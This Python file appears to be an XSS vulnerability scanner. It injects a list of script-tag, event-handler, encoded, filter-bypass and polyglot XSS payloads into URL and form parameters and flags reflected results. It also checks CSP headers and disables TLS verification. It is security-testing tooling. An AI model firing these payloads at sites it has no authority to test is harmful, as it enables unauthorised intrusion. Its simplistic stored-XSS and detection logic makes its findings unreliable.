"""
AdiZen XSS Scanner - Cross-Site Scripting Vulnerability Detection
Author: AdiZenWorks Inc.
License: MIT
"""

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Optional
import time
import re
import html

class AdiZenXSS:
    """Cross-Site Scripting (XSS) vulnerability scanner"""
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'AdiZen-XSS-Scanner/2.0 (Security Testing)'
        })
        
        # XSS payloads - various contexts and bypass techniques
        self.payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            
            # Event handlers
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "<iframe onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            
            # Encoded payloads
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
            
            # Filter bypass techniques
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            
            # Advanced payloads
            "javascript:alert('XSS')",
            "<img src='javascript:alert(\"XSS\")'>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<a href='javascript:alert(\"XSS\")'>Click</a>",
            
            # Attribute breaking
            "\" onmouseover=\"alert('XSS')\"",
            "' onmouseover='alert(\"XSS\")'",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            
            # DOM-based XSS
            "#<img src=x onerror=alert(1)>",
            "javascript:eval('alert(1)')",
            
            # AngularJS/Template injection
            "{{constructor.constructor('alert(1)')()}}",
            "{{7*7}}",
            "${alert(1)}",
            
            # Polyglot payloads
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        ]
        
        # XSS detection patterns
        self.detection_patterns = [
            r"<script[^>]*>.*?alert.*?</script>",
            r"onerror\s*=\s*[\"']?alert",
            r"onload\s*=\s*[\"']?alert",
            r"javascript:\s*alert",
            r"<svg[^>]*onload",
            r"<img[^>]*onerror",
            r"onfocus\s*=\s*[\"']?alert"
        ]
    
    def scan_url(self, url: str, method: str = 'GET', data: Optional[Dict] = None) -> List[Dict]:
        """
        Scan a URL for XSS vulnerabilities
        
        Args:
            url: Target URL
            method: HTTP method (GET/POST)
            data: POST data dictionary
            
        Returns:
            List of detected vulnerabilities
        """
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params and method == 'GET':
            return [{'status': 'info', 'message': 'No parameters found in URL'}]
        
        vulnerabilities = []
        
        # Test each parameter
        if method == 'GET':
            for param in params:
                results = self._test_parameter(url, param, method='GET')
                vulnerabilities.extend(results)
        
        elif method == 'POST' and data:
            for param in data:
                results = self._test_parameter(url, param, method='POST', post_data=data)
                vulnerabilities.extend(results)
        
        self.vulnerabilities.extend(vulnerabilities)
        return vulnerabilities
    
    def _test_parameter(self, url: str, param: str, method: str = 'GET',
                       post_data: Optional[Dict] = None) -> List[Dict]:
        """Test a specific parameter for XSS vulnerabilities"""
        vulnerabilities = []
        
        for payload in self.payloads:
            # Inject payload
            if method == 'GET':
                injected_url = self._inject_payload_url(url, param, payload)
                response = self._send_request(injected_url, 'GET')
            else:
                injected_data = post_data.copy()
                injected_data[param] = payload
                response = self._send_request(url, 'POST', injected_data)
            
            if not response:
                continue
            
            # Check for XSS vulnerability
            vuln = self._analyze_response(response, param, payload)
            
            if vuln:
                vulnerabilities.append(vuln)
                # Continue testing for different XSS types
            
            time.sleep(0.1)  # Rate limiting
        
        return vulnerabilities
    
    def _inject_payload_url(self, url: str, param: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if param in params:
            params[param] = [payload]
        
        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))
    
    def _send_request(self, url: str, method: str = 'GET',
                     data: Optional[Dict] = None) -> Optional[Dict]:
        """Send HTTP request and capture response"""
        try:
            if method == 'GET':
                response = self.session.get(url, timeout=self.timeout, verify=False)
            else:
                response = self.session.post(url, data=data, timeout=self.timeout, verify=False)
            
            return {
                'status_code': response.status_code,
                'content': response.text,
                'headers': dict(response.headers),
                'url': response.url
            }
        except Exception as e:
            return None
    
    def _analyze_response(self, response: Dict, param: str, payload: str) -> Optional[Dict]:
        """Analyze response for XSS indicators"""
        content = response.get('content', '')
        
        # Check if payload is reflected in response
        if payload not in content and html.escape(payload) not in content:
            return None
        
        # Determine XSS type and context
        xss_type = self._determine_xss_type(content, payload)
        context = self._determine_context(content, payload)
        
        # Check if payload is executable (not sanitized)
        is_vulnerable = self._check_executability(content, payload)
        
        if is_vulnerable:
            severity = self._calculate_severity(xss_type, context)
            
            return {
                'type': f'{xss_type} XSS',
                'severity': severity,
                'parameter': param,
                'payload': payload,
                'context': context,
                'evidence': f'Payload reflected in {context} without proper sanitization',
                'confidence': 'HIGH' if xss_type == 'Reflected' else 'MEDIUM'
            }
        
        return None
    
    def _determine_xss_type(self, content: str, payload: str) -> str:
        """Determine type of XSS vulnerability"""
        # Check for reflected XSS
        if payload in content:
            return 'Reflected'
        
        # Check for stored XSS (simplified check)
        if '<script>' in content and 'alert' in content:
            return 'Stored'
        
        # Check for DOM-based XSS indicators
        if 'document.write' in content or 'innerHTML' in content:
            return 'DOM-based'
        
        return 'Reflected'
    
    def _determine_context(self, content: str, payload: str) -> str:
        """Determine where payload appears in HTML"""
        soup = BeautifulSoup(content, 'html.parser')
        
        # Check if in HTML body
        if soup.find(string=re.compile(re.escape(payload[:20]))):
            return 'HTML Body'
        
        # Check if in attribute
        for tag in soup.find_all():
            for attr, value in tag.attrs.items():
                if payload[:20] in str(value):
                    return f'HTML Attribute ({tag.name}.{attr})'
        
        # Check if in script tag
        for script in soup.find_all('script'):
            if payload[:20] in str(script.string):
                return 'JavaScript Context'
        
        return 'Unknown Context'
    
    def _check_executability(self, content: str, payload: str) -> bool:
        """Check if payload is likely to execute"""
        # Check if payload appears unescaped
        for pattern in self.detection_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        
        # Check if HTML entities are NOT used
        if payload in content:
            # Not HTML encoded
            if '<script>' in payload and '<script>' in content:
                return True
            if 'onerror' in payload.lower() and 'onerror' in content.lower():
                return True
            if 'onload' in payload.lower() and 'onload' in content.lower():
                return True
        
        return False
    
    def _calculate_severity(self, xss_type: str, context: str) -> str:
        """Calculate vulnerability severity"""
        if xss_type == 'Stored':
            return 'CRITICAL'
        elif xss_type == 'Reflected' and 'JavaScript' in context:
            return 'HIGH'
        elif xss_type == 'Reflected':
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def scan_form(self, form_data: Dict) -> List[Dict]:
        """
        Scan a web form for XSS vulnerabilities
        
        Args:
            form_data: Dictionary with 'action', 'method', 'inputs'
            
        Returns:
            List of vulnerabilities found
        """
        url = form_data.get('action')
        method = form_data.get('method', 'GET')
        inputs = form_data.get('inputs', [])
        
        # Prepare test data
        test_data = {}
        for input_field in inputs:
            name = input_field.get('name')
            if name:
                test_data[name] = 'test'
        
        return self.scan_url(url, method=method, data=test_data)
    
    def test_csp(self, url: str) -> Dict:
        """Test Content Security Policy implementation"""
        try:
            response = self.session.get(url, timeout=self.timeout)
            csp_header = response.headers.get('Content-Security-Policy', '')
            
            if not csp_header:
                return {
                    'has_csp': False,
                    'severity': 'MEDIUM',
                    'message': 'No Content-Security-Policy header found'
                }
            
            # Analyze CSP directives
            weak_directives = []
            if 'unsafe-inline' in csp_header:
                weak_directives.append('unsafe-inline allows inline scripts')
            if 'unsafe-eval' in csp_header:
                weak_directives.append('unsafe-eval allows eval()')
            if '*' in csp_header:
                weak_directives.append('Wildcard (*) allows any source')
            
            return {
                'has_csp': True,
                'policy': csp_header,
                'weak_directives': weak_directives,
                'severity': 'LOW' if not weak_directives else 'MEDIUM'
            }
        except:
            return {'error': 'Failed to test CSP'}
    
    def generate_report(self) -> Dict:
        """Generate comprehensive XSS scan report"""
        return {
            'total_vulnerabilities': len(self.vulnerabilities),
            'severity_breakdown': {
                'CRITICAL': len([v for v in self.vulnerabilities if v.get('severity') == 'CRITICAL']),
                'HIGH': len([v for v in self.vulnerabilities if v.get('severity') == 'HIGH']),
                'MEDIUM': len([v for v in self.vulnerabilities if v.get('severity') == 'MEDIUM']),
                'LOW': len([v for v in self.vulnerabilities if v.get('severity') == 'LOW'])
            },
            'xss_types': {
                'Reflected': len([v for v in self.vulnerabilities if 'Reflected' in v.get('type', '')]),
                'Stored': len([v for v in self.vulnerabilities if 'Stored' in v.get('type', '')]),
                'DOM-based': len([v for v in self.vulnerabilities if 'DOM-based' in v.get('type', '')])
            },
            'vulnerabilities': self.vulnerabilities,
            'recommendations': self._generate_recommendations()
        }
    
    def _generate_recommendations(self) -> List[str]:
        """Generate security recommendations"""
        return [
            "Implement output encoding/escaping for all user input",
            "Use Content Security Policy (CSP) headers",
            "Validate and sanitize all user input on server-side",
            "Use HTTPOnly and Secure flags for cookies",
            "Implement context-aware output encoding (HTML, JavaScript, URL, CSS)",
            "Use modern frameworks with built-in XSS protection",
            "Perform regular security testing and code reviews",
            "Enable X-XSS-Protection header",
            "Use template engines with auto-escaping features",
            "Avoid using dangerous functions like eval() and innerHTML"
        ]

# CLI Interface
if __name__ == "__main__":
    print("🔥 AdiZen XSS Scanner")
    print("=" * 50)
    
    target = input("Enter target URL (e.g., https://example.com/search?q=test): ")
    method = input("HTTP Method (GET/POST) [GET]: ").upper() or "GET"
    
    scanner = AdiZenXSS()
    
    print(f"\n[+] Scanning {target} for XSS vulnerabilities...")
    print(f"[+] Method: {method}\n")
    
    if method == "POST":
        print("[!] POST data required. Format: key1=value1,key2=value2")
        post_input = input("Enter POST data: ")
        post_data = dict(item.split('=') for item in post_input.split(','))
        results = scanner.scan_url(target, method='POST', data=post_data)
    else:
        results = scanner.scan_url(target, method='GET')
    
    print(f"\n[✓] Scan complete!")
    
    if results:
        print(f"\n[!] VULNERABILITIES FOUND: {len(results)}\n")
        for vuln in results:
            print(f"  Type: {vuln.get('type', 'Unknown')}")
            print(f"  Severity: {vuln.get('severity', 'Unknown')}")
            print(f"  Parameter: {vuln.get('parameter', 'Unknown')}")
            print(f"  Payload: {vuln.get('payload', 'Unknown')[:50]}...")
            print(f"  Context: {vuln.get('context', 'Unknown')}")
            print(f"  Confidence: {vuln.get('confidence', 'Unknown')}")
            print("-" * 50)
    else:
        print("\n[✓] No XSS vulnerabilities detected.")
    
    # Test CSP
    print("\n[+] Testing Content Security Policy...")
    csp_result = scanner.test_csp(target.split('?')[0])
    
    if csp_result.get('has_csp'):
        print(f"  CSP Header: Present")
        if csp_result.get('weak_directives'):
            print(f"  [!] Weak directives found:")
            for directive in csp_result['weak_directives']:
                print(f"      - {directive}")
    else:
        print(f"  [!] No CSP header found - consider implementing one")
    
    report = scanner.generate_report()
    print(f"\nRecommendations:")
    for i, rec in enumerate(report['recommendations'][:5], 1):
        print(f"  {i}. {rec}")


# ── Standalone wrapper function (used by Flask apps) ─────────────────────────
def scan_xss(url: str) -> dict:
    """
    Convenience wrapper: scan the given URL for XSS vulnerabilities.

    Args:
        url: Target URL (GET parameters will be tested)

    Returns:
        dict with 'vulnerabilities', 'total', and 'recommendations'
    """
    scanner = AdiZenXSS()
    vulnerabilities = scanner.scan_url(url)
    report = scanner.generate_report()
    return {
        "url": url,
        "vulnerabilities": vulnerabilities,
        "total": len(vulnerabilities),
        "recommendations": report.get("recommendations", [])
    }
